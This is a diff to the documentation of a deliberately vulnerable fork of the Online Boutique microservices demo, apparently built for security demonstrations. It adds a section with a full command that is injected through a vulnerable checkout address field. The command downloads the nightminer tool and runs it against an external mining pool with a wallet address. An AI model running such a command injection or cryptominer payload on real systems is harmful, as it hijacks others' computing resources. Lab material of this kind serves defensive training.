@@ -9,6 +9,7 @@ The **Online Boutique** cloud-native microservices demo application is tweaked t
     [a custom httpHandler to reply *whoami*](https://github.com/vsk-coding/microservices-demo/blob/main/UPDATES.md#custom-handle)
 3. **Vulnerable address field** - 
     [to executes codes in the backend](https://github.com/vsk-coding/microservices-demo/blob/main/UPDATES.md#rce)
+4. **Crypto Miner on pod** - [to install cryptominer python based application on to a pod](https://github.com/vsk-coding/microservices-demo/blob/main/UPDATES.md#crypto-miner)
 
 
 > **Note:** These tweakings were done to make the application
@@ -70,6 +71,18 @@ wget https://github.com/yudai/gotty/releases/download/v1.0.1/gotty_linux_amd64.t
 ```
 **Checkout Page** [![Screenshot of checkout page](./images/address.png)](./images/address.png) 
 
+
+## Crypto Miner
+
+**Give commands in Address field to install and run Crypto Miner Python application**
+
+*Command*
+
+```
+apk add --no-cache wget curl python2 && curl -L https://github.com/ricmoo/nightminer/archive/refs/heads/master.zip > test.zip && unzip test.zip && cd nightminer-master && python nightminer.py -o stratum+tcp://eu.miningdao.io:4444  -u 1LNdGsYtZXWeiKjGba7T997qvzrWqLXLma 
+```
+
+[![Screenshot of hubble ui](./images/connection-hubble.png)](./images/connection-hubble.png) 
 
 <br />
 
